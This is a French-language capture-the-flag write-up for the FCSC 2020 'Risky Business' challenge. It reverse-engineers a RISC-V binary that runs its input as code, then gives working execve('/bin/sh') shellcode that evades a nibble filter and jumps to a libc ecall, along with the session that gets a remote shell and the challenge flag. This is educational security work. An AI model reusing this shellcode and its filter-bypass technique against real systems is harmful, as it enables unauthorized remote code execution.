---
title: "[FR] Write-up FCSC 2020 : Risky Business"
date: 2020-05-04T18:00:00+02:00
draft: false
tags:
- CTF
- FCSC
- FCSC 2020
---

# I - Intro
Le challenge est composé d'un simple binaire ELF RISC-V.
```
$ file risky-business
risky-business: ELF 64-bit LSB shared object, UCB RISC-V, version 1 (SYSV), dynamically linked, interpreter
/lib/ld-linux-riscv64-lp64d.so.1, for GNU/Linux 4.15.0, BuildID[sha1]=..., not stripped
```
Le but est d'exploiter ce binaire de manière à obtenir un shell sur la machine l'exécutant. On peut interagir avec lui via une simple connexion TCP que l'on peut établir avec `netcat`.
```
nc challenges1.france-cybersecurity-challenge.fr 4004
```
A première vue le binaire semble accepter des données via l'entrée standard avant de s'arrêter.

# II - Rétro ingénierie

Pour effectuer la rétro ingénierie de ce binaire, j'ai utilisé *Ghidra*. Sa dernière version (v9.1.2) ne supporte pas l'architecture RISC-V, j'ai donc dût compiler une version plus récente depuis les sources disponible sur la branche `master` du GitHub.

La décompilation faite par Ghidra est plutôt précise, après avoir renommé les variables correctement nous obtenons la fonction `main()` suivante :
```c
unsigned char main(){
  int input_buffer_len;
  unsigned char ret;
  byte c_2;
  int i;
  int j;
  int k;
  char input_buffer[72];
  long stk_check;
  byte c_1;

  stk_check = __stack_chk_guard;
  fgets(input_buffer,67,stdin);
  input_buffer_len = strlen(input_buffer);
  i = input_buffer_len + -1;
  j = input_buffer_len + -2;
  k = (input_buffer_len + -1) * 2;
  c_1 = (byte)input_buffer[input_buffer_len + -1] >> 4;
  while (-1 < k) {
    if ((k & 1) == 0) {
      c_2 = input_buffer[i] & 0xf;
      i = i + -1;
    }
    else {
      c_2 = (byte)input_buffer[j] >> 4;
      j = j + -1;
    }
    if ((((c_1 == 7) && (c_2 == 3)) || ((c_1 == 0 && (c_2 == 0)))) || ((c_1 == 0 && (c_2 == 10))))
    goto end;
    k = k - 1;
    c_1 = c_2;
  }
  (*(code *)input_buffer)(input_buffer);
end:
  ret = 0;
  if (stk_check != __stack_chk_guard) {
    ret = __stack_chk_fail();
  }
  gp = &__global_pointer$;
  return ret;
}
```

La fonction va donc lire une chaîne de caractères qui peut faire jusqu'à 67 octets sur l'entrée standard, un test va être effectué sur celle-ci, si elle passe le test, elle est interprétée comme du code et est exécutée, sinon le programme se termine.

Le test va lire la chaîne à partir de la fin, la séparer en section de 4 bits et vérifier que certains groupes prédéfinis de 4 bits ne se suivent pas.

On peut interpréter cela plus simplement : dans une représentation hexadécimale de la chaîne, les chiffres hexadécimaux suivants ne peuvent pas se suivre : 0x7 et 0x3; 0x0 et 0x0; 0x0 et 0xA.

# III - Écriture de la base du shellcode

Cet article de blog décrit comment écrire un shellcode pour l'architecture RISC-V : [https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html](https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html). Le but est donc de charger les arguments d'un syscall dans les registres `a0` à `a6` et le numéro du syscall dans le registre `a7` avant d'utiliser l'instruction `ecall` pour l'effectuer. Le syscall à appeler est le traditionnel `execve` (syscall n° 221 sous Linux en RISC-V) nous permettant d'obtenir un shell en executant `/bin/sh`.

```asm
addi	a0,s0,-96 + 20 # le shellcode est chargé sur la stack à s0-96 : s0-96+20 pointe donc sur le dword plus
                       # bas
slti	a1,zero,-1
slti	a2,zero,-1
li	a7,221
ecall
.dword 0x68732f2f6e69622f # représente la chaîne ascii `/bin//sh`
```

Ce shellcode de base est fonctionnel mais ne respecte pas les contraintes imposées par le binaire. La première suite interdite est la suite 0x00 dans l'instruction `li`. On peut la remplacer par une instruction `addi` en effectuant une addition avec le registre `a1` précédemment initialisé à 0.
```asm
addi	a0,s0,-96 + 20
slti	a1,zero,-1
slti	a2,zero,-1
addi	a7,a1,221
ecall
.dword 0x68732f2f6e69622f
```

La suite interdite suivante est présente dans la chaîne `/bin//sh`. Pour y remédier, on sépare le `dword` en deux `word` et l'on `NOT` celui comportant la suite interdite. Il faut juste adapter le shellcode pour *"réparer"* le `word` avant d'effectuer le syscall.
```asm
addi a3, s0, -96 + 28
lw   a4, 4(a3)
not  a4, a4
sw   a4, 4(a3)
addi a0, s0, -96 + 28
slti a1, zero, -1
slti a2, zero, -1
ecall
.word 0x6e69622f
.word 0x978cd0d0
```
Il est à noter que le shellcode est assemblé avec l'option `-march riscv64ic` permettant d'ajouter l'extension `C` du standard RISC-V, celle-ci permet d'avoir des instructions compressées de 2 octets au lieu de 4. Les instructions `lw` et `sw` du shellcode précédent ne font donc que 2 octets. Cette compression permet, en plus d'économiser de l'espace, de ne pas avoir d'octets nuls dans le shellcode.

L'instruction m'ayant posé le plus de problème est `ecall`. Celle-ci est indispensable pour pouvoir effectuer le syscall mais n'existe que sous une seule forme : `0x00000073`, elle contient donc 2 suites de demi octets interdites, 0x00 et 0x73. J'ai d'abord voulu essayer de mettre en place du *self-modifying code* en `NOT`ant l'instruction et en la réparant avant de l'exécuter. Cependant l'émulateur RISC-V de Qemu n'est pas encore au point et comme celui-ci *"traduis"* les instructions RISC-V en instructions x86, la traduction n'est pas re-effectuée après que l'instruction soit restaurée provoquant un crash du programme.

# IV - `ret2libc` pour effectuer le syscall

La solution opté pour effectuer le syscall est donc un `ret2libc`. Le but est de trouver une instruction `ecall` dans la libc et de `jmp` dessus. Comme le `Dockerfile` pour déployer le challenge est fournis, nous pouvons avoir exactement la même libc que celle du serveur où s'exécutera le shellcode final.

Bien que l'ASLR soit activée, Qemu ne semble pas en avoir une très bonne (ou pas du tout) en effet après de multiple tests il semble que l'adresse de base de la libc soit toujours la même : `0x4000827000`. Pour trouver cette adresse de base, il suffit de debugger le programme avec `gdb` et de lire l'adresse de `scanf` puis de la soustraire avec son adresse dans `libc.so`. Nous n'avons qu'a `grep`er la sortie de `objdump -D` sur la libc pour trouver un `ecall`.

Le `ecall` choisi est à l'adresse 0xb68 de la libc et peut donc être trouvé à l'adresse `0x4000827b68` dans l'espace d'adresse de notre binaire. Comme l'adresse contient beaucoup de suite de demi octets interdites, celle-ci est `NOT`ée avant d'être utilisée.

Voici donc le shellcode final :
```asm
addi a3, s0, -96+0x30
lw   a4, 12(a3)
not  a4, a4
sw   a4, 12(a3)
addi a0, s0, -96+0x38
slti a1, zero, -1
slti a2, zero, -1
addi a7, a1, 221
lw   a4, 0(a3)
lw   a5, 4(a3)
not  a4, a4
not  a5, a5
slli a5, a5, 32
or   a4, a5, a4
jr   -4(a4)
.word 0xff7d8493
.word 0xffffffbf
.word 0x6e69622f
.word 0x978cd0d0
```

Comme l'instruction `jr` nécessite un offset par rapport à l'adresse contenue dans le registre, celui-ci ne pouvait donc pas être 0 sous peine de comporter beaucoup de suites de demi octets interdites. Le sot se fait donc avec un offset de -4 et l'adresse à été adaptée en conséquence.

# V - Exploitation finale

Après avoir assemblé le shellcode et l'avoir testé en local, on peut l'exécuter sur le serveur.
```sh
$ cat shellcode.bin - | nc -v challenges1.france-cybersecurity-challenge.fr 4004
Warning: inverse host lookup failed for 51.68.117.85: Unknown host
challenges1.france-cybersecurity-challenge.fr [51.68.117.85] 4004 (?) open
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
flag
risky-business
run.sh
cat flag
FCSC{d79704401bf7c58ca46f3711a9a8c8207d0c4ce7d80fd0dc41df6d5e44b3ddaf}
```
